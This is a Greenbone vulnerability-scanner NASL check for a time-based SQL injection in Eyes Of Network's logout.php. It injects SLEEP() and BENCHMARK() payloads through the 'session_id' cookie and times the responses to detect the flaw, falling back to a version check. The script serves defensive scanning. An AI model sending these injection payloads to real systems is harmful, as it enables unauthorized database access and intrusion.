# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:eyes_of_network:eyes_of_network";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108174");
  script_version("2025-09-10T05:38:24+0000");
  script_cve_id("CVE-2017-1000060", "CVE-2017-14252", "CVE-2017-14247", "CVE-2017-14404",
                "CVE-2017-14405", "CVE-2017-14402", "CVE-2017-14403", "CVE-2017-14401");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-09-10 05:38:24 +0000 (Wed, 10 Sep 2025)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-02-25 19:12:00 +0000 (Thu, 25 Feb 2021)");
  script_tag(name:"creation_date", value:"2017-06-07 09:31:19 +0200 (Wed, 07 Jun 2017)");
  script_name("Eyes Of Network (EON) 'logout.php' SQLi Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_eyesofnetwork_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("eyesofnetwork/http/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/41774/");
  script_xref(name:"URL", value:"https://rioru.github.io/pentest/web/2017/03/28/from-unauthenticated-to-root-supervision.html");

  script_tag(name:"summary", value:"Eyes Of Network (EON) is prone to an SQL injection (SQLi)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check the response time. If the time based check fails also check the version.");

  script_tag(name:"insight", value:"Multiple flaws exist as,

  - The vulnerability is a time-based SQL injection that can be exploited by
    un-authenticated users via an HTTP GET request and affects the logout.php
    and the cookie parameter 'session_id'.

  - Input passed via 'group_id' cookie to side.php script, 'user_id' cookie to
    header.php script, 'tool_list' parameter to module/tool_all/select_tool.php
    script, 'hosts_cacti' array parameter to module/admin_device/index.php script,
    'user_name' parameter to module/admin_user/add_modify_user.php script, 'term'
    parameter to module/admin_group/search.php script and 'user_name' parameter to
    module/admin_user/add_modify_user.php script is not sufficiently validated.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to e.g dump database data out to a malicious server, using an
  out-of-band technique, such as select_loadfile(), conduct SQL Injection
  attacks and execute arbitrary commands on affected system.");

  script_tag(name:"affected", value:"Eyes Of Network (EON) versions 5.1 and
  below are vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) )
  exit( 0 );

ver = infos["version"];
dir = infos["location"];
vt_strings = get_vt_strings();

if( dir == "/" ) dir = "";

url = dir + "/logout.php";

# Chose sleep method, from my tests this is required by different versions of the application
if( version_is_greater_equal( version:ver, test_version:"5.1" ) ) {
  cookie1 = "session_id=" + vt_strings["lowercase"] + "' OR BENCHMARK(";
  cookie2 = "00000000,1)=1 -- -";
  latency += 1;
} else {
  cookie1 = "session_id=" + vt_strings["lowercase"] + "' OR SLEEP(";
  cookie2 = ")=1 -- -";
}

cookie = cookie1 + 0 + cookie2;

# Latency check
req = http_get_req( url:url, port:port, accept_header:"text/html, text/xml", add_headers:make_array( "Cookie", cookie ) );
start = unixtime();
http_keepalive_send_recv( port:port, data:req );
stop = unixtime();
latency = stop - start;
count = 0;

foreach sleep( make_list( 1, 3, 5 ) ) {

  cookie = cookie1 + sleep + cookie2;

  req = http_get_req( url:url, port:port, accept_header:"text/html, text/xml", add_headers:make_array( "Cookie", cookie ) );
  start = unixtime();
  res = http_keepalive_send_recv( port:port, data:req );
  stop = unixtime();
  if( stop - start < sleep || stop - start > ( sleep + 10 + latency ) ) {
    continue;
  } else {
    count += 1;
  }
}

if( count >= 2 ) {
  report = http_report_vuln_url( port:port, url:url ) + ", Cookie used: " + cookie;
  security_message( port:port, data:report );
  exit( 0 );
# Time-based SQLi is currently not that reliable so also report version-based
} else if( version_is_less_equal( version:ver, test_version:"5.1" ) ) {
  report = report_fixed_ver( installed_version:ver, fixed_version:"WillNotFix", install_path:dir );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
